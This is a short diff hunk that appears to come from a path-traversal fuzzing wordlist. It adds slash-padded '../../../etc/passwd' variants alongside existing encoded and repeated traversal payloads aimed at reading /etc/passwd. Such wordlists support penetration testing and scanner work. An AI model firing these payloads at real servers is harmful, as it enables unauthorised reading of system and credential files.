@@ -20,6 +20,9 @@
 /../../../../../../../../../../../../../../../etc/passwd
 /../../../../../../../../../../../../../../../../etc/passwd
 /assets/css///////../../../../../../../../etc/passwd
+//////../../../etc/passwd
+///////../../../etc/passwd
+////////../../../etc/passwd
 %2fetc/passwd
 /..%2fetc/passwd
 /..%2f..%2fetc/passwd
